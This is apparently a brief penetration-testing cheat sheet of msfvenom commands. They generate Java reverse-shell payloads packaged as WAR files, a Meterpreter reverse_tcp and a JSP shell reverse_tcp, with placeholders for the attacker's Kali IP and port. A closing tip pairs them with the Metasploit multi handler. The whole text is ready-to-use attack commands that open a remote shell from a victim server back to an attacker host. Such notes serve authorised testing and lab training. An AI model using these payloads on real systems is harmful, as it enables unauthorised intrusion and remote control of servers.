msfvenom -l payloads | grep java

## Metasploit
```
msfvenom -p java/meterpreter/reverse_tcp LHOST=<Kali IP> LPORT=<Kali port> -f war -o shell.war
```

## Netcat
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Kali IP> LPORT=<Kali port> -f war -o nc_shell.war
```


Always use msf venom if we want the reverse shell on multi handler.